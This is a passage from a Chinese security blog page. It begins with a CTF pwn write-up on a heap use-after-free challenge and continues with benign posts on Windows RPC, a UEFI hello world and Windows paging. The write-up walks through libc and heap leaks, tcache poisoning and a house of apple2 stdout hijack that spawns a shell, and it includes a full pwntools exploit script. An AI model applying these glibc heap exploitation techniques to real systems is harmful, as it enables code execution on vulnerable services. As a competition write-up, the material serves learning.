<p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121110219925.png" alt="image-20251121110219925"></p>
<p>flag只有1 也就是我们只能编辑一次chunk</p>
<h3 id="show-note"><a href="#show-note" class="headerlink" title="show_note"></a>show_note</h3><p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121110307072.png" alt="image-20251121110307072"></p>
<p>其实就是调用了cout把区块的内容打印出来</p>
<pre><code class="hljs c++">std::cout &lt;&lt; chunk的地址 &lt;&lt; std::endl;</code></pre>

<h3 id="泄露libc-base"><a href="#泄露libc-base" class="headerlink" title="泄露libc_base"></a>泄露libc_base</h3><blockquote>
<p>目前以2.39本地环境做示范</p>
</blockquote>
<p>我们循环创建8个chunk 随后再从后向前释放(如果按照顺序释放会导致chunk合并),最后一个chunk会进入到unsorted bin,fd是main_arena+96</p>
<p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121110742601.png" alt="image-20251121110742601"></p>
<p>随后使用show函数查看0号chunk，会打印出main_arena+96，接收</p>
<p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121110911390.png" alt="image-20251121110911390"></p>
<p>然后可以通过有符号的变量或者函数计算偏移去得到libc_base，我在这里使用的是stdout </p>
<p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121111309217.png" alt="image-20251121111309217"></p>
<h3 id="泄露heap地址"><a href="#泄露heap地址" class="headerlink" title="泄露heap地址"></a>泄露heap地址</h3><p>因为在高版本libc内tcache的fd都加密了，所以需要解密，这里给出加密和解密的代码</p>
<pre><code class="hljs python">enctypted_fd = (heap_base &gt;&gt; <span class="hljs-number">12</span>)^target_addr <span class="hljs-comment">#加密</span>
leak_heap_base = uu64(encrypt[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]) &lt;&lt; <span class="hljs-number">12</span> <span class="hljs-comment">#解密</span></code></pre>

<p>我们是需要查看8号chunk的，也就是第一个释放的chunk,他的fd是0，那么也就是(heap_base &gt;&gt; 12)^0 得到他自身，那么我们接收五个字节右移12就得到heap_base</p>
<p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121112052886.png" alt="image-20251121112052886"></p>
<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>拿到了libc_base 和 heap_base 后， 我们就可以打tcache 中毒，把第一个要分配的chunk的fd改成写入的任意地址(注意地址需要加密),我们申请两次chunk就可以得到此内存地址的写入</p>
<p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121112325450.png" alt="image-20251121112325450"></p>
<h3 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h3><blockquote>
<p>本来是打算打io_list_all的stderr流的，构造完了发现完全没作用，因为他不刷stderr,又浪费了很多时间，选择直接打stdout</p>
</blockquote>
<pre><code class="hljs python">fake_file = flat(
    &#123;
        <span class="hljs-number">0x0</span>: <span class="hljs-string">b&quot; sh;&quot;</span>,
        <span class="hljs-number">0x8</span>: libc_stdout - <span class="hljs-number">0x10</span>, <span class="hljs-comment">#</span>
        <span class="hljs-number">0x28</span>: libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>],
        <span class="hljs-number">0x88</span>: libc_base+libc.sym[<span class="hljs-string">&quot;_environ&quot;</span>] - <span class="hljs-number">0x10</span>,
        <span class="hljs-number">0xA0</span>: libc_stdout - <span class="hljs-number">0x40</span>,
        <span class="hljs-number">0xD8</span>: io_wfile_jumps - <span class="hljs-number">0x20</span>,
    &#125;,
    filler=<span class="hljs-string">b&quot;\x00&quot;</span>,
)
</code></pre>

<p>house of apple2 是通过调用_wide_vtable里面的成员函数指针时，没有关于vtable的合法性检查, 所以把vtable设置成io_wfile_jumps</p>
<p>来调用_IO_wfile_overflow 随后调用wfile_wdoallocbuf 执行到我们的system</p>
<p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121120151358.png" alt="image-20251121120151358"></p>
<p>具体细节可以看看这位师傅的，说的很详细<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-279956-1.htm">https://bbs.kanxue.com/thread-279956-1.htm</a></p>
<p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121120640635.png" alt="image-20251121120640635"></p>
<p>payload(2.39本地)</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
<span class="hljs-comment">#from LibcSearcher import *</span>
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span> 

context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>

<span class="hljs-comment">#addr = [&quot;192.168.20.223&quot;,&quot;192.168.20.222&quot;,&quot;192.168.20.225&quot;,&quot;192.168.20.220&quot;,&quot;192.168.20.224&quot;,&quot;192.168.20.143&quot;,&quot;192.168.20.140&quot;,&quot;192.168.20.221&quot;,&quot;192.168.20.138&quot;,&quot;192.168.20.131&quot;,&quot;192.168.20.141&quot;,&quot;192.168.20.133&quot;,&quot;192.168.20.135&quot;,&quot;192.168.20.130&quot;,&quot;192.168.20.134&quot;,&quot;192.168.20.132&quot;,&quot;192.168.20.137&quot;,&quot;192.168.20.142&quot;,&quot;192.168.20.141&quot;,&quot;192.168.20.138&quot;,&quot;192.168.20.136&quot;,&quot;192.168.20.137&quot;]</span>

io = process(<span class="hljs-string">&quot;./pwn&quot;</span>)
e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>) 
libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one-master/libs/2.39-0ubuntu8.6_amd64/libc.so.6&#x27;</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
	<span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():
    attach(io)

s       = <span class="hljs-keyword">lambda</span> data               :io.send(data) <span class="hljs-comment"># send 发送数据</span>
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
dlog     = <span class="hljs-keyword">lambda</span> name,data         :log.success(<span class="hljs-string">f&quot;get <span class="hljs-subst">&#123;name&#125;</span>=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(data))


<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):
    ru(<span class="hljs-string">b&quot;Choice: &quot;</span>)
    <span class="hljs-comment">#sleep(0.1)</span>
    sl(<span class="hljs-string">b&quot;1&quot;</span>)
    ru(<span class="hljs-string">b&quot;Index: &quot;</span>)
    <span class="hljs-comment">#sleep(0.1)</span>
    sl(<span class="hljs-built_in">str</span>(index))
    ru(<span class="hljs-string">b&quot;Size: &quot;</span>)
    <span class="hljs-comment">#sleep(0.1)</span>
    sl(<span class="hljs-built_in">str</span>(size))
    ru(<span class="hljs-string">b&quot;Content: &quot;</span>)
    <span class="hljs-comment">#sleep(0.1)</span>
    sl(content)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>): <span class="hljs-comment">#UAF</span>
    ru(<span class="hljs-string">b&quot;Choice: &quot;</span>)
    <span class="hljs-comment">#sleep(0.1)</span>
    sl(<span class="hljs-string">b&quot;2&quot;</span>)
    ru(<span class="hljs-string">b&quot;Index: &quot;</span>)
    <span class="hljs-comment">#sleep(0.1)</span>
    sl(<span class="hljs-built_in">str</span>(index))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>): <span class="hljs-comment">#only once</span>
    ru(<span class="hljs-string">b&quot;Choice: &quot;</span>)
    sl(<span class="hljs-string">b&quot;3&quot;</span>)
    ru(<span class="hljs-string">b&quot;Index: &quot;</span>)
    sl(<span class="hljs-built_in">str</span>(index))
    ru(<span class="hljs-string">b&quot;content: &quot;</span>)
    sl(content)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):
    ru(<span class="hljs-string">b&quot;Choice: &quot;</span>)
    sl(<span class="hljs-string">b&quot;4&quot;</span>)
    <span class="hljs-comment">#sleep(0.1)</span>
    ru(<span class="hljs-string">b&quot;Index: &quot;</span>)
    sl(<span class="hljs-built_in">str</span>(index))

<span class="hljs-comment">#sla(b&quot;;)&quot;,payload)</span>

<span class="hljs-comment">#bug()</span>


<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>):
    add(i,<span class="hljs-number">0x100</span>,<span class="hljs-string">b&quot;aaa&quot;</span>)

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>):
    delete(<span class="hljs-number">8</span>-i)


show(<span class="hljs-number">0</span>)
ru(<span class="hljs-string">b&quot;Content: &quot;</span>)
leak_main_arena = uu64(r(<span class="hljs-number">6</span>))
dlog(<span class="hljs-string">&quot;leak_main_arena&quot;</span>,leak_main_arena)
libc_base = leak_main_arena + <span class="hljs-number">0xaa0</span> - libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdout_&quot;</span>]
dlog(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)
show(<span class="hljs-number">8</span>)
ru(<span class="hljs-string">b&quot;Content: &quot;</span>)
encrypt = r(<span class="hljs-number">7</span>)
leak_heap_base = uu64(encrypt[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]) &lt;&lt; <span class="hljs-number">12</span>
dlog(<span class="hljs-string">&quot;leak_heap_base&quot;</span>,leak_heap_base)
libc_stdout = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdout_&quot;</span>]
dlog(<span class="hljs-string">&quot;libc_stdout&quot;</span>,libc_stdout)

enctypted_fd = (leak_heap_base &gt;&gt; <span class="hljs-number">12</span>)^libc_stdout
dlog(<span class="hljs-string">&quot;enctypted_fd&quot;</span>,enctypted_fd)

edit(<span class="hljs-number">2</span>,p64(enctypted_fd))

add(<span class="hljs-number">9</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">b&quot;aaa&quot;</span>) <span class="hljs-comment"># chunk2</span>
<span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string"></span>
<span class="hljs-string">&#x27;&#x27;&#x27;</span>

io_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_wfile_jumps&quot;</span>]

bug()

fake_file = flat(
    &#123;
        <span class="hljs-number">0x0</span>: <span class="hljs-string">b&quot; sh;&quot;</span>,
        <span class="hljs-number">0x8</span>: libc_stdout - <span class="hljs-number">0x10</span>,
        <span class="hljs-number">0x28</span>: libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>],
        <span class="hljs-number">0x88</span>: libc_base+libc.sym[<span class="hljs-string">&quot;_environ&quot;</span>] - <span class="hljs-number">0x10</span>,
        <span class="hljs-number">0xA0</span>: libc_stdout - <span class="hljs-number">0x40</span>,
        <span class="hljs-number">0xD8</span>: io_wfile_jumps - <span class="hljs-number">0x20</span>,
    &#125;,
    filler=<span class="hljs-string">b&quot;\x00&quot;</span>,
)



add(<span class="hljs-number">10</span>,<span class="hljs-number">0x100</span>,<span class="hljs-built_in">bytes</span>(fake_file)) <span class="hljs-comment"># stdout</span>
itr()

        
</code></pre>

<p>在比赛中主要是打了io_list_all和patch浪费了很多时间，2.35的话把获取libc_base的偏移改成2.35的然后elf换成2.35的就可以用了，如果有ORW就直接栈迁移，迁移进新分配的一个0x1ff的chunk就可以。ogg亲测栈不对齐，如果要使用ogg的话还得栈迁移去ret,就不如system(“sh”)好了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://b.iakb.org/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/" data-id="cmlh5cv7t000bskuaau7s664i" data-title="2025年广西网络与信息安全职业技能竞赛决赛 pwn writeup" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2025/" rel="tag">2025</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/house-of-apple2/" rel="tag">house of apple2</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/match/" rel="tag">match</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Windows-RPC-初探" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/" class="article-date">
  <time class="dt-published" datetime="2025-09-21T13:37:47.000Z" itemprop="datePublished">2025-09-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/">Windows RPC 初探</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>IDL(接口定义语言)文件:</p>
<pre><code class="hljs C">import <span class="hljs-string">&quot;oaidl.idl&quot;</span>;
[
    uuid(fa63b4aa-cde1<span class="hljs-number">-461b</span>-a201<span class="hljs-number">-54</span>eb3ea1808b), <span class="hljs-comment">//定义uuid</span>
    version(<span class="hljs-number">1.0</span>) <span class="hljs-comment">//定义版本号</span>
]

interface myrpc <span class="hljs-comment">//定义rpc接口 interface</span>
&#123;
    <span class="hljs-type">void</span> <span class="hljs-title function_">input</span><span class="hljs-params">(<span class="hljs-type">char</span>* <span class="hljs-built_in">string</span>)</span>;
&#125;</code></pre>

<p>ACF文件:</p>
<pre><code class="hljs C">[
	implicit_handle(<span class="hljs-type">handle_t</span> rpcBinding)
]

interface myrpc&#123;

&#125;</code></pre>

<p>implicit_handle 表示是隐式句柄</p>
<p><img src="/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/image-20250921215508572.png" alt="image-20250921215508572"></p>
<p>随后在Native Tools 内使用midl工具生成服务端和客户端所用的.c和.h文件</p>
<p><strong>这里注意 如果要x64的RPC程序需要使用X64的Native Tools！！！</strong></p>
<p><img src="/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/image-20250921215526737.png" alt="image-20250921215526737"></p>
<p>myrpc.h为客户端与服务端公用</p>
<p>_c文件为Client所用</p>
<p>_s文件为Server所用</p>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><blockquote>
<p>​     服务端必须包含两个内存分配函数。这两个函数被服务端程序调用：midl_user_allocate和midl _user_free。这两个函数在服务端分配和释放内存，一般情况下midl _user_allocate和midl_user_free都会简单地封装C库函数malloc和free。</p>
</blockquote>
<pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;../IDL/myrpc.h&quot;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> RPC_PORT <span class="hljs-string">L&quot;12345&quot;</span></span>

<span class="hljs-type">void</span> <span class="hljs-title function_">input</span><span class="hljs-params">(<span class="hljs-type">char</span> * <span class="hljs-built_in">string</span>)</span> &#123;
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[RPC]%s\n&quot;</span>, <span class="hljs-built_in">string</span>);
	<span class="hljs-keyword">return</span>;
&#125;


<span class="hljs-type">int</span> <span class="hljs-title function_">wmain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">wchar_t</span>* argv[])</span>
&#123;
	<span class="hljs-comment">// 采用tcp协议，13521端口</span>
	RpcServerUseProtseqEp((RPC_WSTR)<span class="hljs-string">L&quot;ncacn_ip_tcp&quot;</span>, RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
		(RPC_WSTR)RPC_PORT, <span class="hljs-literal">NULL</span>);
	<span class="hljs-comment">// 注意：从Windows XP SP2开始，增强了安全性的要求，如果用RpcServerRegisterIf()注册接口，客户端调用时会出现</span>
	<span class="hljs-comment">// RpcExceptionCode() == 5，即Access Denied的错误，因此，必须用RpcServerRegisterIfEx带RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH标志</span>
	<span class="hljs-comment">// 允许客户端直接调用</span>
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[RPC]Server Running in port %ls\n&quot;</span>, RPC_PORT);
	RpcServerRegisterIfEx(myrpc_v1_0_s_ifspec, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
	<span class="hljs-comment">// 开始监听，本函数将一直阻塞</span>
	RPC_STATUS result = RpcServerListen(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>, FALSE);


	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;


<span class="hljs-type">void</span> __RPC_FAR* __RPC_USER <span class="hljs-title function_">midl_user_allocate</span><span class="hljs-params">(<span class="hljs-type">size_t</span> len)</span>
&#123;
	<span class="hljs-keyword">return</span>(<span class="hljs-built_in">malloc</span>(len));
&#125;
<span class="hljs-type">void</span> __RPC_USER <span class="hljs-title function_">midl_user_free</span><span class="hljs-params">(<span class="hljs-type">void</span> __RPC_FAR* ptr)</span>
&#123;
	<span class="hljs-built_in">free</span>(ptr);
&#125;</code></pre>

<p><img src="/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/image-20250921222537530.png" alt="image-20250921222537530"></p>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;../IDL/myrpc.h&quot;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
	RPC_WSTR pszStringBinding = <span class="hljs-literal">NULL</span>;

	RpcStringBindingCompose(
		<span class="hljs-literal">NULL</span>,
		(RPC_WSTR)<span class="hljs-string">L&quot;ncacn_ip_tcp&quot;</span>,
		(RPC_WSTR)<span class="hljs-string">L&quot;127.0.0.1&quot;</span>,
		(RPC_WSTR)<span class="hljs-string">L&quot;12345&quot;</span>,
		<span class="hljs-literal">NULL</span>,
		&amp;pszStringBinding
	);

	<span class="hljs-comment">// 绑定接口，这里要和 test.acf 的配置一致，那么就是test_Binding</span>
	RpcBindingFromStringBinding(pszStringBinding, &amp;rpcBinding);

	<span class="hljs-comment">// 下面是调用服务端的函数了</span>
	RpcTryExcept
	&#123;
		<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)
		&#123;
			input(<span class="hljs-string">L&quot;Hello World!&quot;</span>);
			Sleep(<span class="hljs-number">1000</span>);
		&#125;

	&#125;
		RpcExcept(<span class="hljs-number">1</span>)
	&#123;
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RPC Exception %d\n&quot;</span>, RpcExceptionCode());
		Sleep(<span class="hljs-number">2000</span>);
	&#125;
	RpcEndExcept


		<span class="hljs-comment">// 释放资源</span>
	RpcStringFree(&amp;pszStringBinding);
	RpcBindingFree(&amp;rpcBinding);

	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;





<span class="hljs-comment">// 下面的函数是为了满足链接需要而写的，没有的话会出现链接错误</span>
<span class="hljs-type">void</span> __RPC_FAR* __RPC_USER <span class="hljs-title function_">midl_user_allocate</span><span class="hljs-params">(<span class="hljs-type">size_t</span> len)</span>
&#123;
	<span class="hljs-keyword">return</span>(<span class="hljs-built_in">malloc</span>(len));
&#125;
<span class="hljs-type">void</span> __RPC_USER <span class="hljs-title function_">midl_user_free</span><span class="hljs-params">(<span class="hljs-type">void</span> __RPC_FAR* ptr)</span>
&#123;
	<span class="hljs-built_in">free</span>(ptr);
&#125;</code></pre>

<p><img src="/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/image-20250921223201311.png" alt="image-20250921223201311"></p>
<p>由于宽字符串的问题 所以只显示第一个字符 已经成功建立RPC远程通信</p>
<p><img src="/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/image-20250921223238178.png" alt="image-20250921223238178"></p>
<p>客户端和服务端都需要引入rpcrt4.lib</p>
<h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit:"></a>Credit:</h2><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-262291.htm">https://bbs.kanxue.com/thread-262291.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/herojuice/article/details/81015325">https://blog.csdn.net/herojuice/article/details/81015325</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://b.iakb.org/2025/09/21/Windows-RPC-%E5%88%9D%E6%8E%A2/" data-id="cmlh5cv7u000fskua1jif3g7y" data-title="Windows RPC 初探" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RPC/" rel="tag">RPC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-UEFI-Start-Hello-World" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/09/17/UEFI-Start-Hello-World/" class="article-date">
  <time class="dt-published" datetime="2025-09-17T03:19:00.000Z" itemprop="datePublished">2025-09-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/09/17/UEFI-Start-Hello-World/">UEFI Start - Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>最近在看《从零开始的UEFI裸机编程》(<a target="_blank" rel="noopener" href="https://kagurazakakotori.github.io/ubmp-cn),%E4%BD%9C%E8%80%85%E7%BF%BB%E8%AF%91%E7%9A%84%E9%9D%9E%E5%B8%B8%E5%A5%BD%E3%80%82%E6%8E%A8%E8%8D%90%E8%A7%82%E7%9C%8B%E3%80%82">https://kagurazakakotori.github.io/ubmp-cn),作者翻译的非常好。推荐观看。</a></p>
<p><img src="/2025/09/17/UEFI-Start-Hello-World/image-20250917112343059.png" alt="image-20250917112343059"></p>
<p>我们在UEFI入口点传递的SystemTable指针其实就是当系统的UEFI执行到我们的入口点时自动传递的。</p>
<p>所以我们调用的ClearScreen和OutputString都是调用的系统UEFI内的函数。</p>
<p>网上大部分都是使用edk2去编译UEFI的内容，但是edk2其实很繁琐。这也就是为什么我选择了《从零开始的UEFI裸机编程》开始学习UEFI原理。</p>
<pre><code class="hljs Bash"><span class="hljs-built_in">sudo</span> apt install gcc-mingw-w64-x86-64</code></pre>

<pre><code class="hljs Bash">x86_64-w64-mingw32-gcc -Wall -Wextra -e efi_main -nostdinc -nostdlib \        -fno-builtin -Wl,--subsystem,10 -o main.efi main.c</code></pre>

<p>进入UEFI Shell 然后fs0: 切换到fs0</p>
<p>在这里还踩了坑 UEFI不认NTFS格式的分区</p>
<p>然后执行</p>
<p><img src="/2025/09/17/UEFI-Start-Hello-World/image-20250917112653974.png" alt="image-20250917112653974"></p>
<p><img src="/2025/09/17/UEFI-Start-Hello-World/image-20250917112802000.png" alt="image-20250917112802000"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://b.iakb.org/2025/09/17/UEFI-Start-Hello-World/" data-id="cmlh5cv7v000hskua5zorfbaw" data-title="UEFI Start - Hello World" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/UEFI/" rel="tag">UEFI</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-windows-虚拟内存笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2025-08-18T06:45:40.000Z" itemprop="datePublished">2025-08-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/">windows 虚拟内存笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Windows-分页"><a href="#Windows-分页" class="headerlink" title="Windows 分页"></a>Windows 分页</h2><p><img src="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/image-20250818144719375.png" alt="image-20250818144719375"></p>
<p>线性地址通过4层页表变成物理地址，让CPU实际可以访问到物理地址。</p>
<p>也就是说，线性地址其实是由四层页表+偏移组合而成的</p>
<p><img src="/2025/08/18/windows-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AC%94%E8%AE%B0/640.webp" alt="图片"></p>
<p>线性地址组成</p>
